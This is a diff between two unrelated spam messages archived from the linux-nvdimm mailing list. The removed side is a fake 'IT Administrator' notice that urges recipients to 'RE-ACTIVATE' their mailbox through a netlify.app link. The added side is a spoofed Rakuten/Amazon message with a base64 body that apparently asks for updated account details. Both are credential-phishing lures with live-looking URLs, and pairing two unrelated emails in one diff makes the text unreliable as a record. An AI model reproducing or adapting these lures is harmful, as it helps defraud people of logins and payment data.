@@ -2,154 +2,66 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 018CF366526
-	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 08:05:56 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 4091436654C
+	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 08:20:17 +0200 (CEST)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id F32E3100EC1D3;
-	Tue, 20 Apr 2021 23:05:52 -0700 (PDT)
-Received-SPF: None (mailfrom) identity=mailfrom; client-ip=198.23.206.55; helo=198-23-206-55-host.colocrossing.com; envelope-from=linux-nvdimm@lists.01.org; receiver=<UNKNOWN> 
-Received: from 198-23-206-55-host.colocrossing.com (unknown [198.23.206.55])
-	by ml01.01.org (Postfix) with ESMTP id C7C92100EC1C8
-	for <linux-nvdimm@lists.01.org>; Tue, 20 Apr 2021 23:05:50 -0700 (PDT)
-From: IT Administrator <linux-nvdimm@lists.01.org>
-To: linux-nvdimm@lists.01.org
-Subject: =?UTF-8?B?W0FDVCBOT1ddIOKduyDinIkgSW5jb21pbmcgbWFpbHMgaGFzIGJsb2NrZWQh?=
-Date: 21 Apr 2021 08:05:45 +0200
-Message-ID: <20210421080545.5107ECF61365B03E@lists.01.org>
+	by ml01.01.org (Postfix) with ESMTP id 70CE7100EB32D;
+	Tue, 20 Apr 2021 23:20:15 -0700 (PDT)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=107.150.117.50; helo=rakuten.co.jp; envelope-from=postmaster@rakuten.co.jp; receiver=<UNKNOWN> 
+Received: from rakuten.co.jp (unknown [107.150.117.50])
+	by ml01.01.org (Postfix) with ESMTP id 1DE06100EB32C
+	for <linux-nvdimm@lists.01.org>; Tue, 20 Apr 2021 23:20:12 -0700 (PDT)
+Message-ID: <20210421082013281406@rakuten.co.jp>
+From: "myinfo" <postmaster@rakuten.co.jp>
+To: <linux-nvdimm@lists.01.org>
+Subject: =?shift_jis?B?QW1hem9ug3aDiYNDg4CCzI6pk66NWJBWkN2S6ILwifCPnA==?=
+	=?shift_jis?B?gqKCvYK1gtyCtYK9gUk=?=
+Date: Wed, 21 Apr 2021 08:20:00 +0100
 MIME-Version: 1.0
-Message-ID-Hash: B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX
-X-Message-ID-Hash: B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX
-X-MailFrom: linux-nvdimm@lists.01.org
+X-mailer: Sopvqsheb 9
+Message-ID-Hash: PS3NQCDY474RXGO4NKCSYZOJBZD7DQQX
+X-Message-ID-Hash: PS3NQCDY474RXGO4NKCSYZOJBZD7DQQX
+X-MailFrom: postmaster@rakuten.co.jp
 X-Mailman-Rule-Hits: nonmember-moderation
 X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
+X-Content-Filtered-By: Mailman/MimeDel 3.1.1
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/PS3NQCDY474RXGO4NKCSYZOJBZD7DQQX/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
-Content-Type: multipart/mixed; boundary="===============7073317311791844656=="
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: base64
 
---===============7073317311791844656==
-Content-Type: text/html
-Content-Transfer-Encoding: quoted-printable
-
-<!DOCTYPE HTML>
-
-<html><head><title></title>
-<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-</head>
-<body style=3D"margin: 0.4em;">
-<table width=3D"100%" style=3D"color: rgb(51, 51, 51); text-transform: none=
-; letter-spacing: normal; font-family: helvetica, arial, sans-serif; font-s=
-ize: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
-pace: normal; orphans: 2; widows: 2; font-stretch: inherit; font-variant-li=
-gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
- text-decoration-thickness: initial; text-decoration-style: initial; text-d=
-ecoration-color: initial;" bgcolor=3D"#ffffff"=20
-border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"le=
-ft" style=3D"margin: 0px; line-height: 18px; font-family: Roboto, RobotoDra=
-ft, Helvetica, Arial, sans-serif; font-size: 15px;"><table width=3D"100%" s=
-tyle=3D"font-family: inherit; font-size: 16px; font-stretch: inherit;" bord=
-er=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin=
-: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font=
--size: 12px;"><p>
-<span style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: i=
-nherit; vertical-align: inherit; font-stretch: inherit;"><b>Dear<span style=
-=3D"color: rgb(0, 0, 255);">&nbsp;linux-nvdimm</span><font color=3D"#ff0000=
-">,</font></b></span></p><p><span style=3D"border-width: 0px; margin: 0px; =
-padding: 0px; font-family: inherit; vertical-align: inherit; font-stretch: =
-inherit;"><b>You have some incoming messages that are placed on hold, due t=
-o mailbox&nbsp; upgrade.</b></span></p><p><b>
-<span style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: i=
-nherit; vertical-align: inherit; font-stretch: inherit;">Kindly&nbsp;<span =
-style=3D"color: rgb(255, 0, 0);"><a href=3D"https://quizzical-haibt-5ac4a6.=
-netlify.app/#linux-nvdimm@lists.01.org">RE-ACTIVATE</a></span>&nbsp;your ac=
-count<span style=3D"color: rgb(255, 0, 0);"><span>&nbsp;<a href=3D"https://=
-quizzical-haibt-5ac4a6.netlify.app/#linux-nvdimm@lists.01.org">linux-nvdimm=
-@lists.01.org</a></span>&nbsp;</span>&nbsp;<wbr>below to access incoming me=
-ssages.</span>
-&nbsp;&nbsp;</b></p></td></tr><tr><td style=3D"margin: 0px; font-family: Ro=
-boto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 12px;"><br><tab=
-le align=3D"left" style=3D"font-family: inherit; font-stretch: inherit;" bo=
-rder=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td height=3D"30"=
- align=3D"center" valign=3D"middle" style=3D"margin: 0px; border: 1px solid=
- rgb(232, 180, 99); font-family: Roboto, RobotoDraft, Helvetica, Arial, san=
-s-serif;" bgcolor=3D"#ffe86c">
-<table width=3D"100%" style=3D"text-align: left; font-stretch: inherit;" bg=
-color=3D"transparent" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
-dy><tr><td width=3D"13" style=3D"margin: 0px; font-family: Roboto, RobotoDr=
-aft, Helvetica, Arial, sans-serif;"><table width=3D"13" style=3D"font-famil=
-y: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadd=
-ing=3D"1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto, RobotoD=
-raft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td>
-<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
-l, sans-serif;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px=
-; color: rgb(0, 0, 0); font-family: inherit; font-size: 13px; font-weight: =
-bold; vertical-align: baseline; display: block; white-space: nowrap; font-s=
-tretch: inherit;"><span style=3D"border-width: 0px; margin: 0px; padding: 0=
-px; font-family: inherit; vertical-align: inherit; font-stretch: inherit;">=
-
-<a style=3D"color: rgb(0, 0, 204);" href=3D"https://quizzical-haibt-5ac4a6.=
-netlify.app/#linux-nvdimm@lists.01.org" target=3D"_blank" rel=3D"noreferrer=
-" data-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.=
-com/url?q=3Dhttp://f0530289.xsph.ru/edit/?i%3Di%260%3Dsales01@stargoldmedic=
-s.com&amp;source=3Dgmail&amp;ust=3D1618965122042000&amp;usg=3DAFQjCNGHTMS1t=
-x8aT2GMH0pOYcXSQbnW9A">RE-ACTIVATE HERE</a></span></span></td>
-<td width=3D"13" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, He=
-lvetica, Arial, sans-serif;"><table width=3D"13" style=3D"font-family: inhe=
-rit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
-1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, H=
-elvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td></tr></t=
-body></table></td></tr></tbody></table></td></tr></tbody></table></td>
-<td width=3D"20" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, He=
-lvetica, Arial, sans-serif; font-size: 9px;"><table width=3D"20" style=3D"f=
-ont-family: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0"=
- cellpadding=3D"1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto=
-, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 12px;">&nbsp;</td><=
-/tr></tbody></table></td></tr></tbody></table>
-<p style=3D"color: rgb(33, 33, 33); text-transform: none; text-indent: 0px;=
- letter-spacing: normal; font-family: Verdana; font-size: 15px; font-style:=
- normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans:=
- 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures=
-: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-d=
-ecoration-thickness: initial; text-decoration-style: initial; text-decorati=
-on-color: initial;">
-<span style=3D"color: rgb(51, 51, 51); font-family: inherit; font-size: 13p=
-x;"><br>&nbsp; &nbsp;<span>&nbsp;</span><b>Best Regards&nbsp;&nbsp;</b></sp=
-an></p>
-<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(51, =
-51, 51); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
-nt-family: Verdana; font-size: 13px; font-style: normal; font-weight: 400; =
-word-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: =
-2; widows: 2; font-stretch: inherit; background-color: rgb(255, 255, 255); =
-font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
-oke-width: 0px; text-decoration-thickness: initial;=20
-text-decoration-style: initial; text-decoration-color: initial;"><p><span s=
-tyle=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: inherit;=
- vertical-align: inherit; font-stretch: inherit;"><b>&nbsp; &nbsp;&nbsp; Ad=
-ministrator.&nbsp;</b></span></p><p><span style=3D"border-width: 0px; margi=
-n: 0px; padding: 0px; color: rgb(46, 154, 254); font-family: arial, serif, =
-EmojiFont; font-size: small; vertical-align: baseline; font-stretch: inheri=
-t;"><b><font size=3D"3">
-&nbsp; &nbsp; &nbsp;&copy; 2021<span>&nbsp;</span><span>lists.01.org&nbsp;<=
-/span>Administrator.&nbsp;All Rights Reserved.</font></b></span></p></div><=
-p>
-</p>
-
-
-</body></html>
---===============7073317311791844656==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
-To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
-
---===============7073317311791844656==--
+DQoNCg0KDQoNCuOCr+ODrOOCuOODg+ODiOOCq+ODvOODieaDheWgseOBruabtOaWsOOAgei/veWK
+oOOBquOBqeOBq+OBpOOBjeOBvuOBl+OBpuOAgeS7peS4i+OBruaJi+mghuOCkuOBlOeiuuiqjeOB
+j+OBoOOBleOBhOOAguOCouOCq+OCpuODs+ODiOOCteODvOODk+OCueOBi+OCiUFtYXpvbuaDheWg
+seOCkueuoeeQhuOBmeOCi+ODmuODvOOCuOOBq+OCouOCr+OCu+OCueOBl+OBpuOAgeabtOaWsOOB
+l+OBpuOBj+OBoOOBleOBhOOAgg0KDQrjgb7jgZ/jgIFBbWF6b27jg5fjg6njgqTjg6DmnJ/plpPj
+gYzntYLkuobjgZfjgZ/jgonjgIEg44GK5oCl44GO5L6/54Sh5paZIOOChCDjg5fjg6njgqTjg6Dj
+g7vjg5Pjg4fjgqropovmlL7poYwg44Gq44Gp44Gu44OX44Op44Kk44Og5Lya5ZOh54m55YW444Gu
+44GU5Yip55So44GM44Gn44GN44Gq44GP44Gq44KK44G+44GZ44CCKOS4u+OBquODl+ODqeOCpOOD
+oOS8muWToeeJueWFuOOCkueiuuiqjeOBmeOCi+OBq+OBryDjgZPjgaHjgonjgpLjgq/jg6rjg4Pj
+gq/jgZfjgabjgY/jgaDjgZXjgYQp44CC5pep44KB44Gr44GK5omL57aa44GN44Gu56iL44KI44KN
+44GX44GP44GK6aGY44GE6Ie044GX44G+44GZDQoNCg0K57aZ57aa44GX44Gm44OX44Op44Kk44Og
+5Lya5ZOh54m55YW444KS44GK5qW944GX44G/44GE44Gf44Gg44GN44Gf44GE5aC05ZCI44Gv44CB
+44CMQW1hem9u44OX44Op44Kk44Og5Lya5ZOh5oOF5aCx44Gu566h55CG44CN44Oa44O844K444Gr
+44Gm44CM5Lya5ZOh6LOH5qC844KS57aZ57aa44GZ44KL44CNIOOCkuOCr+ODquODg+OCr+OBl+OB
+puOBj+OBoOOBleOBhOOAgg0KDQogDQogICDkvJrlk6Hmg4XloLHjga7nrqHnkIbjg5rjg7zjgrjj
+gafnorroqo0gICANCiANCg0KDQoNCg0K44Gq44GK44CBNzLmmYLplpPku6XlhoXjgavjgZTnorro
+qo3jgYzjgarjgYTloLTlkIjjgIHoqqDjgavnlLPjgZfoqLPjgZTjgZbjgYTjgb7jgZvjgpPjgIHj
+gYrlrqLmp5jjga7lronlhajjga7ngrrjgIHjgqLjgqvjgqbjg7Pjg4jjga7liKnnlKjliLbpmZDj
+gpLjgZXjgZvjgabjgYTjgZ/jgaDjgY3jgb7jgZnjga7jgafjgIHkuojjgoHjgZTkuobmib/jgY/j
+gaDjgZXjgYTjgIINCg0K44Ki44Kr44Km44Oz44OI44Gr55m76Yyy44GuReODoeODvOODq+OCouOD
+ieODrOOCueOBq+OCouOCr+OCu+OCueOBp+OBjeOBquOBhOWgtOWQiA0K44GK5ZWP44GE5ZCI44KP
+44Gb77yaIEFtYXpvbuOCq+OCueOCv+ODnuODvOOCteODvOODk+OCueOAgg0KDQpBbWF6b27jgrXj
+g7zjg5PjgrnjgpLjgZTliKnnlKjjgYTjgZ/jgaDjgY3jgIHjgYLjgorjgYzjgajjgYbjgZTjgZbj
+gYTjgb7jgZfjgZ/jgIINCg0KDQoNCg0KIEFtYXpvbi5jby5qcCAg44Kr44K544K/44Oe44O844K1
+44O844OT44K5ICANCg0KIApfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f
+X19fX19fXwpMaW51eC1udmRpbW0gbWFpbGluZyBsaXN0IC0tIGxpbnV4LW52ZGltbUBsaXN0cy4w
+MS5vcmcKVG8gdW5zdWJzY3JpYmUgc2VuZCBhbiBlbWFpbCB0byBsaW51eC1udmRpbW0tbGVhdmVA
+bGlzdHMuMDEub3JnCg==
